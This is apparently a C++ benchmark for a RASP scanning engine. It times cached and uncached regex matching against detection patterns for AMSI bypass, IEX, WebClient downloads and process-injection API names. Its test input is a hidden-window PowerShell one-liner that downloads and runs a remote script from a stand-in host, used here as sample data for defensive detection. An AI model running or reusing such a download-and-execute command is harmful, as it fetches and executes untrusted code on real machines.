#include "rasp_lua_engine.h"
#include "rasp_scan_budget.h"

#include <chrono>
#include <iostream>
#include <string>
#include <vector>

namespace {

void SilentLog(const char*)
{
}

long long MeasureCachedMatches(const std::vector<std::string>& patterns,
                               const std::string& subject,
                               int iterations,
                               size_t& cacheEntries)
{
    RaspLuaEngine engine;
    engine.SetLogFn(SilentLog);

    std::string matched;
    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < iterations; ++i) {
        ScanExecutionContext exec;
        exec.deadline = ScanDeadline::FromNow(std::chrono::milliseconds(exec.budget.totalBudgetMs));
        matched.clear();
        (void)engine.MatchesAnyRegex(patterns, subject, matched, &exec);
    }
    auto elapsed = std::chrono::steady_clock::now() - start;
    cacheEntries = engine.RegexCacheSizeForTesting();
    return std::chrono::duration_cast<std::chrono::microseconds>(elapsed).count();
}

long long MeasureColdMatches(const std::vector<std::string>& patterns,
                             const std::string& subject,
                             int iterations,
                             size_t& lastCacheEntries)
{
    std::string matched;
    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < iterations; ++i) {
        RaspLuaEngine engine;
        engine.SetLogFn(SilentLog);

        ScanExecutionContext exec;
        exec.deadline = ScanDeadline::FromNow(std::chrono::milliseconds(exec.budget.totalBudgetMs));
        matched.clear();
        (void)engine.MatchesAnyRegex(patterns, subject, matched, &exec);
        lastCacheEntries = engine.RegexCacheSizeForTesting();
    }
    auto elapsed = std::chrono::steady_clock::now() - start;
    return std::chrono::duration_cast<std::chrono::microseconds>(elapsed).count();
}

} // namespace

int main()
{
#ifndef RASP_PCRE2_AVAILABLE
    std::cout << "PCRE2 is not available; benchmark skipped.\n";
    return 0;
#else
    const std::vector<std::string> patterns = {
        "(?i)(amsiutils|amsiinitfailed|amsiscanbuffer|amsi\\.dll|amsicontext)",
        "(?i)(invoke-expression|\\biex\\b)\\s*[({\"']",
        "(?i)(downloadstring|downloadfile|invoke-webrequest|net\\.webclient)",
        "(?i)(virtu?alalloc|writeprocessmemory|createthread|loadlibrary)",
    };
    const std::string subject =
        "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example/a.ps1')\"";
    const int iterations = 2000;

    size_t cachedEntries = 0;
    const long long cachedUs = MeasureCachedMatches(patterns, subject, iterations, cachedEntries);

    size_t coldEntries = 0;
    const long long coldUs = MeasureColdMatches(patterns, subject, iterations, coldEntries);

    std::cout << "iterations=" << iterations << "\n";
    std::cout << "patterns=" << patterns.size() << "\n";
    std::cout << "cached_total_us=" << cachedUs << "\n";
    std::cout << "cached_avg_us=" << (cachedUs / static_cast<double>(iterations)) << "\n";
    std::cout << "cached_entries=" << cachedEntries << "\n";
    std::cout << "cold_total_us=" << coldUs << "\n";
    std::cout << "cold_avg_us=" << (coldUs / static_cast<double>(iterations)) << "\n";
    std::cout << "cold_last_entries=" << coldEntries << "\n";
    if (cachedUs > 0)
        std::cout << "cold_to_cached_ratio=" << (coldUs / static_cast<double>(cachedUs)) << "\n";

    return 0;
#endif
}
